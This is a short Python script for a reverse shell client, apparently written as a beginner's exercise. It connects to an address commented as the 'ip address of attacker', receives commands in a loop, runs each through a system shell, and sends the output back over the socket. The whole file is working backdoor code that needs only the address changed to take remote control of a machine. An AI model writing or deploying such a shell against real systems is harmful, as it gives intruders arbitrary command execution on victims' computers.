import socket
#subprocess :#The Python subprocess module can be used to run new programs or applications
import subprocess
import json
import base64


def reliable_send(data): #send and recieve data as much as we want
        
    #sock.send(data)
    try:
        if isinstance(data, bytes):
            # If data is bytes, encode it to a base64-encoded string as we are getting data in 
            #Base64 encoding is a method to encode binary data as ASCII characters.
            json_data = json.dumps({'data': base64.b64encode(data).decode()})
        else:
            # Otherwise, serialize the data as JSON
            json_data = json.dumps(data)
        sock.send(json_data.encode())  # Send the JSON data in sequesnce bytes using UTF8 encoded
    except Exception as e:
        print("Error sending data:", e)

def reliable_recv():
        json_data =""
        #print("While loop")
        while True:
             try: 
                  json_data=json_data+sock.recv(1024).decode().replace("'", '"')
                 
                  return json.loads(json_data) #parse the json object
             except ValueError:
                  continue
             


def shell():
    while True:
        command=reliable_recv()
        #print("Inside shell function")
        
        if(command ==("q" or "Q")):
            break
        else:
            #chat command
            #answer=input("Enter message to server : ")
            #sock.send(answer.encode())
            
            #open terminal

            try:
                proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                result=proc.stdout.read() + proc.stderr.read()
                reliable_send(result)
            except:
                 reliable_send("Can't Execute")   

sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("127.0.0.1",54321))  #ip address of attacker
print("connection establish to server")  
shell()  
sock.close()